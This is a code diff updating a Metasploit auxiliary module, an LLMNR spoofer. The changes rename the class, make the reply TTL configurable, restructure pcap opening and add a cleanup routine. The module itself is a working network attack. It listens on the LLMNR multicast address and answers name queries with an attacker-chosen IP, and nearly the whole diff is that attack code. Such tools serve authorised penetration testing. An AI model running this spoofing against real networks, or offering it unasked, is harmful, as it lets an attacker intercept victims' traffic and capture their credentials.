@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -8,7 +8,7 @@ require 'socket'
 require 'ipaddr'
 require 'net/dns'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
 include Msf::Exploit::Capture
 
@@ -44,11 +44,7 @@ attr_accessor :sock, :thread
     register_options([
       OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", ""]),
       OptRegexp.new('REGEX', [ true, "Regex applied to the LLMNR Name to determine if spoofed reply is sent", '.*']),
-      OptInt.new('TTL', [ false, "Time To Live for the spoofed response", 300]),
-    ])
-
-    register_advanced_options([
-      OptBool.new('Debug', [ false, "Determines whether incoming packet parsing is displayed", false])
+      OptInt.new('TTL', [ false, "Time To Live for the spoofed response", 30]),
     ])
 
     deregister_options('RHOST', 'PCAPFILE', 'SNAPLEN', 'FILTER')
@@ -83,13 +79,13 @@ attr_accessor :sock, :thread
         print_good("#{rhost.to_s.ljust 16} llmnr - #{name} matches regex, responding with #{datastore['SPOOFIP']}")
       end
 
-      # qType is not a Fixnum, so to compare it with `case` we have to
+      # qType is not a Integer, so to compare it with `case` we have to
       # convert it
       case question.qType.to_i
       when ::Net::DNS::A
         dns_pkt.answer << ::Net::DNS::RR::A.new(
           :name => name,
-          :ttl => 30,
+          :ttl => datastore['TTL'],
           :cls => ::Net::DNS::IN,
           :type => ::Net::DNS::A,
           :address => spoof.to_s
@@ -97,7 +93,7 @@ attr_accessor :sock, :thread
       when ::Net::DNS::AAAA
         dns_pkt.answer << ::Net::DNS::RR::AAAA.new(
           :name => name,
-          :ttl => 30,
+          :ttl => datastore['TTL'],
           :cls => ::Net::DNS::IN,
           :type => ::Net::DNS::AAAA,
           :address => (spoof.ipv6? ? spoof : spoof.ipv4_mapped).to_s
@@ -139,9 +135,7 @@ attr_accessor :sock, :thread
     end
     ip_pkt.recalc
 
-    open_pcap
-      capture_sendto(ip_pkt, rhost.to_s, true)
-    close_pcap
+    capture_sendto(ip_pkt, rhost.to_s, true)
   end
 
   def monitor_socket
@@ -176,7 +170,10 @@ attr_accessor :sock, :thread
 
   def run
     check_pcaprub_loaded()
-    ::Socket.do_not_reverse_lookup = true
+    ::Socket.do_not_reverse_lookup = true  # Mac OS X workaround
+
+    # Avoid receiving extraneous traffic on our send socket
+    open_pcap({'FILTER' => 'ether host f0:f0:f0:f0:f0:f0'})
 
     # Multicast Address for LLMNR
     multicast_addr = ::IPAddr.new("224.0.0.252")
@@ -191,24 +188,28 @@ attr_accessor :sock, :thread
     self.sock = Rex::Socket.create_udp(
       # This must be INADDR_ANY to receive multicast packets
       'LocalHost' => "0.0.0.0",
-      'LocalPort' => 5355)
+      'LocalPort' => 5355,
+      'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
+    )
     self.sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
     self.sock.setsockopt(::Socket::IPPROTO_IP, ::Socket::IP_ADD_MEMBERSHIP, optval)
 
     self.thread = Rex::ThreadFactory.spawn("LLMNRServerMonitor", false) {
-        monitor_socket
+      monitor_socket
     }
 
     print_status("LLMNR Spoofer started. Listening for LLMNR requests with REGEX \"#{datastore['REGEX']}\" ...")
 
     add_socket(self.sock)
 
-    while thread.alive?
-      select(nil, nil, nil, 0.25)
-    end
-
-    self.thread.kill
-    self.sock.close rescue nil
+    self.thread.join
   end
 
+  def cleanup
+    if self.thread and self.thread.alive?
+      self.thread.kill
+      self.thread = nil
+    end
+    close_pcap
+  end
 end
